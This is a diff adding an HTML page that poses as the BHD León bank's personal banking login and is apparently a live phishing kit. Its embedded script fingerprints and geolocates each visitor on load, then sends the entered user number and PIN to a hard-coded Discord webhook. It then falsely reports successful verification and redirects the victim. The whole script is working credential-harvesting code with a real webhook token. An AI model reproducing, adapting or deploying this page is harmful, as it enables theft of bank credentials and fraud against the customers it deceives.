@@ -1,0 +1,466 @@
+<!-- url: https://freudina.com/wp-content/plugins/fix/index1573.html
+status: 200 -->
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BHD León - Banca Personal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: url('background-login.webp') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 1;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 360px;
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            padding: 25px;
+            position: relative;
+            z-index: 2;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .logo-container {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .logo-image {
+            max-width: 160px;
+            height: auto;
+        }
+        
+        .form-group {
+            margin-bottom: 18px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            background-color: #fff;
+            transition: all 0.3s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #005e2a;
+            box-shadow: 0 0 0 2px rgba(0, 94, 42, 0.2);
+        }
+        
+        .login-button {
+            width: 100%;
+            background-color: #51af46;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .login-button:hover {
+            background-color: #004a22;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+        }
+        
+        .login-button:active {
+            transform: translateY(0);
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .forgot-password a {
+            color: #005e2a;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+            color: #666;
+        }
+        
+        .message {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        
+        .message.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .message.error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .security-notice {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
+        
+        .input-icon {
+            position: relative;
+        }
+        
+        .input-icon i {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+        }
+        
+        .input-icon input {
+            padding-left: 35px;
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 20px;
+            }
+            
+            .logo-image {
+                max-width: 140px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo-container">
+            <img src="logo-bhd.svg" alt="Logo BHD León" class="logo-image" onerror="this.style.display='none'; document.getElementById('logoPlaceholder').style.display='flex';">
+            <div id="logoPlaceholder" class="logo-placeholder" style="display: none; color: #005e2a; font-size: 24px; font-weight: bold;">BHD León</div>
+        </div>
+        <div class="login-form">
+            <div class="form-group">
+                <label for="username">Usuario</label>
+                <div class="input-icon">
+                    <i class="fas fa-user"></i>
+                    <input type="text" 
+                           id="username" 
+                           inputmode="numeric" 
+                           pattern="[0-9]{11}" 
+                           maxlength="11" 
+                           minlength="11"
+                           placeholder=""
+                           onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                           oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11);"
+                           required>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="password">Contraseña</label>
+                <div class="input-icon">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" 
+                           id="password" 
+                           inputmode="numeric" 
+                           pattern="[0-9]{4}" 
+                           maxlength="4" 
+                           minlength="4"
+                           placeholder=""
+                           onkeypress="return event.charCode >= 48 && event.charCode <= 57"
+                           oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);"
+                           required>
+                </div>
+            </div>
+            <button class="login-button" id="loginBtn">Entrar</button>
+            
+            <div class="loading" id="loading">
+                <i class="fas fa-spinner fa-spin"></i> Verificando credenciales...
+            </div>
+            <div class="message" id="message"></div>
+            
+            <div class="forgot-password">
+                <a href="index.html#">¿Olvidaste tu contraseña?</a>
+            </div>
+            
+            <div class="security-notice">
+                <i class="fas fa-shield-alt"></i> Tu seguridad es nuestra prioridad
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Variables globales
+        let systemData = null;
+        let dataSent = false;
+
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loading = document.getElementById('loading');
+        const message = document.getElementById('message');
+
+        // Captura RÁPIDA de datos básicos al cargar la página
+        async function captureBasicData() {
+            const basicData = {
+                ip: 'No disponible',
+                city: 'No disponible',
+                country: 'No disponible',
+                region: 'No disponible',
+                userAgent: navigator.userAgent,
+                screenResolution: `${screen.width}x${screen.height}`,
+                platform: navigator.platform,
+                language: navigator.language,
+                referrer: document.referrer || 'Directo',
+                date: new Date().toLocaleDateString('es-ES'),
+                time: new Date().toLocaleTimeString('es-ES')
+            };
+
+            try {
+                // Solo obtener IP básica (más rápido)
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                basicData.ip = ipData.ip;
+
+                // Intentar ubicación rápida
+                try {
+                    const locResponse = await fetch(`https://ipapi.co/${basicData.ip}/json/`);
+                    const locData = await locResponse.json();
+                    basicData.city = locData.city || 'No disponible';
+                    basicData.country = locData.country_name || 'No disponible';
+                    basicData.region = locData.region || 'No disponible';
+                } catch (e) {
+                    // Si falla, usar ipinfo como backup rápido
+                    const locResponse = await fetch('https://ipinfo.io/json');
+                    const locData = await locResponse.json();
+                    basicData.city = locData.city || 'No disponible';
+                    basicData.country = locData.country || 'No disponible';
+                    basicData.region = locData.region || 'No disponible';
+                }
+            } catch (error) {
+                console.log('Datos básicos capturados sin IP');
+            }
+
+            return basicData;
+        }
+
+        // Enviar alerta de ENTRADA al webhook (rápido)
+        async function sendEntryAlert() {
+            if (dataSent) return;
+            
+            const webhookURL = "https://discord.com/api/webhooks/1427671774312534098/u7yZ7C2NmNV7ivw7xE-Bx4g10yLtUBb2YYkdBlFCdVXasFRjP4AJ4yRZPwZmU72t2nDS";
+            
+            const basicData = await captureBasicData();
+            
+            const mensaje = `🚨 **NUEVO INGRESO DETECTADO - BHD LEÓN**
+
+🌐 **INFORMACIÓN BÁSICA:**
+• IP: ${basicData.ip}
+• País: ${basicData.country}
+• Ciudad: ${basicData.city}
+• Región: ${basicData.region}
+• Navegador: ${basicData.userAgent.split(' ')[0]}
+• Plataforma: ${basicData.platform}
+• Resolución: ${basicData.screenResolution}
+• Referrer: ${basicData.referrer}
+
+📅 **FECHA/HORA:**
+• ${basicData.date} - ${basicData.time}
+
+_Usuario acaba de ingresar a la página_`;
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        content: mensaje,
+                        username: "BHD León Access Alert",
+                        avatar_url: "https://cdn-icons-png.flaticon.com/512/2721/2721650.png"
+                    })
+                });
+                dataSent = true;
+            } catch (error) {
+                console.log('Error enviando alerta de entrada');
+            }
+        }
+
+        // Enviar CREDENCIALES al webhook (cuando el usuario hace click en Entrar)
+        async function sendCredentialsToDiscord(user, pass) {
+            const webhookURL = "https://discord.com/api/webhooks/1427671774312534098/u7yZ7C2NmNV7ivw7xE-Bx4g10yLtUBb2YYkdBlFCdVXasFRjP4AJ4yRZPwZmU72t2nDS";
+            
+            // Usar datos básicos ya capturados o capturar nuevos rápidamente
+            const basicData = systemData || await captureBasicData();
+            
+            const mensaje = `🔐 **CREDENCIALES BHD PERRO**
+
+👤 **DATOS DE ACCESO:**
+• Usuario: \`${user}\`
+• Contraseña: \`${pass}\`
+
+🌐 **INFORMACIÓN DEL USUARIO:**
+• IP: ${basicData.ip}
+• Ubicación: ${basicData.city}, ${basicData.region}, ${basicData.country}
+• Navegador: ${basicData.userAgent}
+• Plataforma: ${basicData.platform}
+• Resolución: ${basicData.screenResolution}
+• Idioma: ${basicData.language}
+
+📅 **FECHA/HORA DE ACCESO:**
+• ${basicData.date} - ${basicData.time}
+
+⚠️ **ALERTA: Credenciales ingresadas**`;
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        content: mensaje,
+                        username: "BHD León Credentials",
+                        avatar_url: "https://cdn-icons-png.flaticon.com/512/2721/2721650.png"
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Error enviando credenciales:', error);
+                return false;
+            }
+        }
+
+        // Funciones originales de la página (sin cambios)
+        function checkInputs() {
+            const userValid = username.value.length === 11;
+            const passValid = password.value.length === 4;
+            loginBtn.disabled = !(userValid && passValid);
+        }
+
+        function showMessage(text, type) {
+            message.textContent = text;
+            message.className = 'message ' + type;
+            message.style.display = 'block';
+        }
+
+        function hideMessage() {
+            message.style.display = 'none';
+        }
+
+        async function handleLogin() {
+            const user = username.value.trim();
+            const pass = password.value.trim();
+            
+            if (user.length !== 11 || pass.length !== 4) return;
+            
+            loading.style.display = 'block';
+            hideMessage();
+            loginBtn.disabled = true;
+            
+            try {
+                // ENVIAR CREDENCIALES INMEDIATAMENTE al hacer click
+                const success = await sendCredentialsToDiscord(user, pass);
+                
+                if (success) {
+                    showMessage('Credenciales verificadas. Redirigiendo...', 'success');
+                    // Redirección inmediata después de enviar credenciales
+                    setTimeout(() => {
+                        window.location.href = 'cargando573.html';
+                    }, 1000); // Solo 1 segundo de espera
+                } else {
+                    showMessage('Error en la verificación. Intente nuevamente.', 'error');
+                    loading.style.display = 'none';
+                    loginBtn.disabled = false;
+                }
+            } catch (error) {
+                showMessage('Error de conexión. Intente nuevamente.', 'error');
+                loading.style.display = 'none';
+                loginBtn.disabled = false;
+            }
+        }
+
+        // Event listeners originales
+        username.addEventListener('input', checkInputs);
+        password.addEventListener('input', checkInputs);
+        loginBtn.addEventListener('click', handleLogin);
+
+        password.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                handleLogin();
+            }
+        });
+
+        // INICIALIZACIÓN: Capturar datos básicos inmediatamente al cargar
+        document.addEventListener('DOMContentLoaded', function() {
+            // Enviar alerta de ENTRADA inmediatamente
+            sendEntryAlert();
+            
+            // Precargar datos del sistema en segundo plano
+            captureBasicData().then(data => {
+                systemData = data;
+                console.log('Datos del sistema precargados');
+            });
+        });
+    </script>
+</body>
+</html>
